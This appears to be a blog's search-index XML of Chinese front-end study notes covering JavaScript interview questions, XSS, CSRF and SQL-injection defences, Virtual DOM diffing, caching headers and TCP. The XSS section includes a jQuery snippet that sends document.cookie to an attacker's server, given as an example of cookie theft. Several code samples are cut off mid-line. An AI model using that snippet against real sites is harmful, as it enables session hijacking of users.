要实现ajax下的前后退功能成本较大 可能造成请求数的增加 跨域问题限制 JSON是一种轻量级的数据交换格式，ECMA的一个子集 优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字） ==8. 看下列代码输出为何？解释原因。==123var a;alert(typeof a); // undefinedalert(b); // 报错 解释：Undefined是一个只有一个值的数据类型，这个值就是“undefined”，在使用var声明变量但并未对其赋值进行初始化时，这个变量的值就是undefined。而b由于未声明将报错。注意未申明的变量和声明了未赋值的是不一样的。 ==9. 看下列代码,输出什么？解释原因。==12var a = null;alert(typeof a); //object 解释：null是一个只有一个值的数据类型，这个值就是null。表示一个空指针对象，所以用typeof检测会返回”object”。 ==10. 看下列代码,输出什么？解释原因。=123456789var undefined;undefined == null; // true1 == true; // true2 == true; // false0 == false; // true0 == ''; // trueNaN == NaN; // false[] == false; // true[] == ![]; // true undefined与null相等，但不恒等（===） 一个是number一个是string时，会尝试将string转换为number 尝试将boolean转换为number，0或1 尝试将Object转换成number或string，取决于另外一个对比量的类型 所以，对于0、空字符串的判断，建议使用 “===” 。“===”会先判断两边的值类型，类型不匹配时为false。 那么问题来了，看下面的代码，输出什么，foo的类型为什么？ 123var foo = "11"+2-"1";console.log(foo);console.log(typeof foo); 执行完后foo的值为111，foo的类型为Number。 123var foo = "11"+2+"1"; //体会加一个字符串'1' 和 减去一个字符串'1'的不同console.log(foo);console.log(typeof foo); 执行完后foo的值为1121(此处是字符串拼接)，foo的类型为String。 ==11. 看代码给答案。==12345var a = new Object();a.value = 1;b = a;b.value = 2;alert(a.value); 答案：2（考察引用数据类型细节） ==12. 已知数组var stringArray = [“This”, “is”, “Baidu”, “Campus”]，Alert出”This is Baidu Campus”==。答案：alert(stringArray.join(“ “)) 那么问题来了，已知有字符串foo=”get-element-by-id”,写一个function将其转化成驼峰表示法”getElementById”。 123456789function combo(msg){ var arr = msg.split("-"); var len = arr.length; //将arr.length存储在一个局部变量可以提高for循环效率 for(var i=1;i]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习资料]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%2F</url>
    <content type="text"><![CDATA[前端知识结构 https://github.com/JacksonTian/fks 前端入门：https://github.com/qiu-deqing/FE-learning 博客： https://www.xuanfengge.com https://www.w3cplus.com/ https://www.w3ctech.com/ http://www.css88.com/ https://www.qianduan.net/ http://www.ruanyifeng.com/blog/ http://javascript.ruanyifeng.com/ http://es6.ruanyifeng.com/ 书籍：https://www.xuanfengge.com/fe-books.html 公司前端团队 腾讯 AlloyTeam http://www.alloyteam.com/ 百度fex http://fex.baidu.com/ 百度efe http://efe.baidu.com/ 淘宝FED http://taobaofed.org/ 去哪儿UED http://ued.qunar.com/ 奇舞团 https://75team.com/ 开源项目 Facebook Projects https://code.facebook.com/projects/web/ 百度fex https://github.com/fex-team/ efe https://github.com/ecomfe alloyteam-github http://alloyteam.github.io/ underscore源码解读 https://github.com/hanzichi/underscore-analysis vue源码学习 https://github.com/answershuto/learnVue 前端学习资源汇总：https://jeffjade.com/2016/03/30/104-front-end-tutorial/]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端资料</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[其他问题总结]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[==1. WEB前端安全那些事儿==前端攻击都有哪些形式，我该如何防范？XSS攻击是什么？XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。​1234567891011121314151617181920212223 用户名： 第一条状态：侯医生的状态1 第二条状态：侯医生的状态2 第三条状态：侯医生的状态3 运行时，展现形式如图所示： 但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图 123 如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码： 12345$.ajax({ url: '自己的服务器', dataType: 'jsonp', data: {'盗取的用户cookie': document.cookie}}); 如何防范目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图 123456789101112131415161718192021222324 用户名： 第一条状态：侯医生的状态1 第二条状态：侯医生的状态2 第三条状态：侯医生的状态3 其实，我们再来看看网页源码，如图1.2.2 虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(>重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。 但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。 这就是所谓的 Virtual DOM 算法。包括几个步骤： ==用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档书中== ==当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异== ==把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了== Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。 3. 算法实现3.1 步骤一：用JS对象模拟DOM树用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点： element.js 123456789function Element (tagName, props, children) { this.tagName = tagName this.props = props this.children = children}module.exports = function (tagName, props, children) { return new Element(tagName, props, children)} 例如上面的 DOM 结构就可以简单的表示： 1234567var el = require('./element')var ul = el('ul', {id: 'list'}, [ el('li', {class: 'item'}, ['Item 1']), el('li', {class: 'item'}, ['Item 2']), el('li', {class: 'item'}, ['Item 3'])]) 现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的: 123456789101112131415161718192021Element.prototype.render = function () { var el = document.createElement(this.tagName) // 根据tagName构建 var props = this.props for (var propName in props) { // 设置节点的DOM属性 var propValue = props[propName] el.setAttribute(propName, propValue) } var children = this.children || [] children.forEach(function (child) { var childEl = (child instanceof Element) ? child.render() // 如果子节点也是虚拟DOM，递归构建DOM节点 : document.createTextNode(child) // 如果字符串，只构建文本节点 el.appendChild(childEl) }) return el} render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要： 12var ulRoot = ul.render()document.body.appendChild(ulRoot) 上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构： 12345 Item 1 Item 2 Item 3 3.2 步骤二：比较两棵虚拟DOM树的差异正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比： 上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。 3.2.1 深度优先遍历，记录差异在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记： 在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。 123456789101112131415161718192021222324252627282930// diff 函数，对比两棵树function diff (oldTree, newTree) { var index = 0 // 当前节点的标志 var patches = {} // 用来记录每个节点差异的对象 dfsWalk(oldTree, newTree, index, patches) return patches}// 对两棵树进行深度优先遍历function dfsWalk (oldNode, newNode, index, patches) { // 对比oldNode和newNode的不同，记录下来 patches[index] = [...] diffChildren(oldNode.children, newNode.children, index, patches)}// 遍历子节点function diffChildren (oldChildren, newChildren, index, patches) { var leftNode = null var currentNodeIndex = index oldChildren.forEach(function (child, i) { var newChild = newChildren[i] currentNodeIndex = (leftNode && leftNode.count) // 计算节点的标识 ? currentNodeIndex + leftNode.count + 1 : currentNodeIndex + 1 dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点 leftNode = child })} 例如，上面的div和新的div有差异，当前的标记是0，那么： 1patches[0] = [{difference}, {difference}, ...] // 用数组存储新旧节点的不同 3.2.2 差异类型上面说的节点的差异指的是什么呢？对 DOM 操作可能会： 替换掉原来的节点，例如把上面的div换成了section 移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换 修改了节点的属性 对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。 所以我们定义了几种差异类型： 1234var REPLACE = 0var REORDER = 1var PROPS = 2var TEXT = 3 对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下： 1234patches[0] = [{ type: REPALCE, node: newNode // el('section', props, children)}]]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>笔试面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[==1. 如何解决跨域问题==JSONP：原理是：动态插入script标签，通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。 优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。 JSONP：json+padding（内填充），顾名思义，就是把JSON填充到一个盒子里 123456789101112131415 function createJs(sUrl){ var oScript = document.createElement('script'); oScript.type = 'text/javascript'; oScript.src = sUrl; document.getElementsByTagName('head')[0].appendChild(oScript); } createJs('jsonp.js'); box({ 'name': 'test' }); function box(json){ alert(json.name); } CORS服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 通过修改document.domain来跨子域将子域和主域的document.domain设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用document.domain进行跨域 主域相同的使用document.domain 使用window.name来进行跨域window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的 使用HTML5中新引进的window.postMessage方法来跨域传送数据还有flash、在服务器上设置代理页面等跨域方式。个人认为window.name的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。 ==2. XML和JSON的区别？==(1).数据体积方面。JSON相对于XML来讲，数据的体积小，传递的速度更快些。 (2).数据交互方面。JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。 (3).数据描述方面。JSON对数据的描述性比XML较差。 (4).传输速度方面。JSON的速度要远远快于XML。 ==3. 谈谈你对webpack的看法==WebPack 是一个模块打包工具，你可以使用WebPack管理你的模块依赖，并编绎输出模块们所需的静态文件。它能够很好地管理、打包Web开发中所用到的HTML、Javascript、CSS以及各种静态文件（图片、字体等），让开发过程更加高效。对于不同类型的资源，webpack有对应的模块加载器。webpack模块打包器会分析模块间的依赖关系，最后 生成了优化且合并后的静态资源。 webpack的两大特色： code splitting（可以自动完成） loader 可以处理各种类型的静态文件，并且支持串联操作 webpack 是以commonJS的形式来书写脚本滴，但对 AMD/CMD 的支持也很全面，方便旧项目进行代码迁移。 webpack具有requireJs和browserify的功能， 但仍有很多自己的新特性：对 CommonJS 、 AMD 、ES6的语法做了兼容 对js、css、图片等资源文件都支持打包 串联式模块加载器以及插件机制，让其具有更好的灵活性和扩展性，例如提供对CoffeeScript、ES6的支持 有独立的配置文件webpack.config.js 可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间 支持 SourceUrls 和 SourceMaps，易于调试 具有强大的Plugin接口，大多是内部插件，使用起来比较灵活 webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快 ==4. 说说TCP传输的三次握手四次挥手策略==为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。用TCP协议把数据包送出去后，TCP不会对传送 后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：SYN和ACK。 发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。 最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。 断开一个TCP连接则需要“四次挥手”： 第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。 第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号）。 第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。 ==5. TCP和UDP的区别==TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来 UDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。 ==6. 说说你对作用域链的理解==作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到window对象即被终止，作用域链向下访问变量是不被允许的。 ==7. 创建ajax过程== 创建XMLHttpRequest对象,也就是创建一个异步调用对象. 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. 设置响应HTTP请求状态变化的函数. 发送HTTP请求. 获取异步调用返回的数据. 使用JavaScript和DOM实现局部刷新. ==8. 常见web安全及防护原理==sql注入原理就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 总的来说有以下几点： 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。 XSS原理及防范Xss(cross-site scripting)攻击指的是攻击者往Web页面里插入恶意 html标签或者javascript代码。 比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。 XSS防范方法首先代码里对用户输入的地方和变量都需要仔细检查长度和对””,”;”,”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击。 首先，避免直接在cookie 中泄露用户隐私，例如email、密码等等。 其次，通过使cookie 和系统ip 绑定来降低cookie 泄露后的危险。这样攻击者得到的cookie 没有实际价值，不可能拿来重放。 如果网站不需要再浏览器端对cookie 进行操作，可以在Set-Cookie 末尾加上HttpOnly 来防止javascript 代码直接获取cookie 。 尽量采用POST 而非GET 提交表单 XSS与CSRF有什么区别吗？XSS是获取信息，不需要提前知道其他用户页面的代码和数据包。CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 CSRF的防御 服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。 通过验证码的方法 ==9. Web Worker 和webSocket==worker主线程: 通过 worker = new Worker( url ) 加载一个JS文件来创建一个worker，同时返回一个worker实例。 通过worker.postMessage( data ) 方法来向worker发送数据。 绑定worker.onmessage方法来接收worker发送过来的数据。 可以使用 worker.terminate() 来终止一个worker的执行。 WebSocketWebSocket是Web应用程序的传输协议，它提供了双向的，按序到达的数据流。他是一个HTML5协议，WebSocket的连接是持久的，他通过在客户端和服务器之间保持双工连接，服务器的更新可以被及时推送给客户端，而不需要客户端以一定时间间隔去轮询。 ==10. HTTP和HTTPS==HTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS。 默认HTTP的端口号为80，HTTPS的端口号为443。 ==11. 为什么HTTPS安全==因为网络请求需要中间有很多的服务器路由器的转发。中间的节点都可能篡改信息，而如果使用HTTPS，密钥在你和终点站才有。https之所以比http安全，是因为他利用ssl/tls协议传输。它包含证书，卸载，流量转发，负载均衡，页面适配，浏览器适配，refer传递等。保障了传输过程的安全性 ==12. 对前端模块化的认识== AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。 CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。 AMD 是提前执行，CMD 是延迟执行。 AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。 CMD模块方式 123define(function(require, exports, module) { // 模块代码}); ==13. Javascript垃圾回收方法==标记清除（mark and sweep）这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。 垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了 引用计数(reference counting)在低版本IE中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。 在IE中虽然JavaScript对象通过标记清除的方式进行垃圾回收，但BOM与DOM对象却是通过引用计数回收垃圾的，也就是说只要涉及BOM及DOM就会出现循环引用问题。 ==14. 你觉得前端工程的价值体现在哪== 为简化用户使用提供技术支持（交互部分） 为多个浏览器兼容性提供支持 为提高用户浏览速度（浏览器性能）提供支持 为跨平台或者其他基于webkit或其他渲染引擎的应用提供支持 为展示数据提供支持（数据接口） ==15. 谈谈性能优化问题==缓存利用：缓存Ajax，使用CDN，使用外部js和css文件以便缓存，添加Expires头，服务端配置Etag，减少DNS查找等 请求数量：合并样式和脚本，使用css图片精灵，初始首屏之外的图片资源按需加载，静态资源延迟加载。 请求带宽：压缩文件，开启GZIP， 代码层面的优化： 避免使用css表达式，避免使用高级选择器，通配选择器。 用hash-table来优化查找 少用全局变量 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能 用setTimeout来避免页面失去响应 缓存DOM节点查找的结果 避免使用CSS Expression 避免全局查询 避免使用with(with会创建自己的作用域，会增加作用域链长度) 多个变量声明合并 避免图片和iFrame等的空Src。空Src会重新加载当前页面，影响速度和效率 尽量避免写在HTML标签中写Style属性 ==16. 移动端性能优化== 尽量使用css3动画，开启硬件加速。 适当使用touch事件代替click事件。 避免使用css3渐变阴影效果。 可以用transform: translateZ(0)来开启硬件加速。 不滥用Float。Float在渲染时计算量比较大，尽量减少使用 不滥用Web字体。Web字体需要下载，解析，重绘当前页面，尽量减少使用。 合理使用requestAnimationFrame动画代替setTimeout CSS中的属性（CSS3 transitions、CSS3 3D transforms、Opacity、Canvas、WebGL、Video）会触发GPU渲染，请合理使用。过渡使用会引发手机过耗电增加 PC端的在移动端同样适用 ==17. 什么是Etag？==当发送一个服务器请求时，浏览器首先会进行缓存过期判断。浏览器根据缓存过期时间判断缓存文件是否过期。 情景一：若没有过期，则不向服务器发送请求，直接使用缓存中的结果，此时我们在浏览器控制台中可以看到 200 OK(from cache) ，此时的情况就是完全使用缓存，浏览器和服务器没有任何交互的。 情景二：若已过期，则向服务器发送请求，此时请求中会带上①中设置的文件修改时间，和Etag 然后，进行资源更新判断。服务器根据浏览器传过来的文件修改时间，判断自浏览器上一次请求之后，文件是不是没有被修改过；根据Etag，判断文件内容自上一次请求之后，有没有发生变化 情形一：若两种判断的结论都是文件没有被修改过，则服务器就不给浏览器发index.html的内容了，直接告诉它，文件没有被修改过，你用你那边的缓存吧—— 304 Not Modified，此时浏览器就会从本地缓存中获取index.html的内容。此时的情况叫协议缓存，浏览器和服务器之间有一次请求交互。 情形二：若修改时间和文件内容判断有任意一个没有通过，则服务器会受理此次请求，之后的操作同 只有get请求会被缓存，post请求不会 ==18. Expires和Cache-Control==Expires要求客户端和服务端的时钟严格同步。HTTP1.1引入Cache-Control来克服Expires头的限制。如果max-age和Expires同时出现，则max-age有更高的优先级。 12345Cache-Control: no-cache, private, max-age=0ETag: abcdeExpires: Thu, 15 Apr 2014 20:00:00 GMTPragma: privateLast-Modified: $now // RFC1123 format ==19. ETag应用:==Etag由服务器端生成，客户端通过If-Match或者说If-None-Match这个条件判断请求来验证资源是否修改。常见的是使用If-None-Match。请求一个文件的流程可能如下： ====第一次请求=== 客户端发起 HTTP GET 请求一个文件； 服务器处理请求，返回文件内容和一堆Header，当然包括Etag(例如”2e681a-6-5d044840”)(假设服务器支持Etag生成和已经开启了Etag).状态码200 ====第二次请求=== 客户端发起 HTTP GET 请求一个文件，注意这个时候客户端同时发送一个If-None-Match头，这个头的内容就是第一次请求时服务器返回的Etag：2e681a-6-5d0448402.服务器判断发送过来的Etag和计算出来的Etag匹配，因此If-None-Match为False，不返回200，返回304，客户端继续使用本地缓存；流程很简单，问题是，如果服务器又设置了Cache-Control:max-age和Expires呢，怎么办 答案是同时使用，也就是说在完全匹配If-Modified-Since和If-None-Match即检查完修改时间和Etag之后， 服务器才能返回304.(不要陷入到底使用谁的问题怪圈) 为什么使用Etag请求头? Etag 主要为了解决 Last-Modified 无法解决的一些问题。 ==20. 栈和队列的区别?==栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的。 队列先进先出，栈先进后出。 栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除 ==21. 栈和堆的区别？==栈区（stack）— 由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。 堆区（heap） — 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。 堆（数据结构）：堆可以被看成是一棵树，如：堆排序； 栈（数据结构）：一种先进后出的数据结构。 ==22. 快速 排序的思想并实现一个快排？==“快速排序”的思想很简单，整个排序过程只需要三步： （1）在数据集之中，找一个基准点 （2）建立两个数组，分别存储左边和右边的数组 （3）利用递归进行下次比较 123456789101112131415161718192021 function quickSort(arr){ if(arr.length]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>笔试面试</tag>
      </tags>
  </entry>
</search>
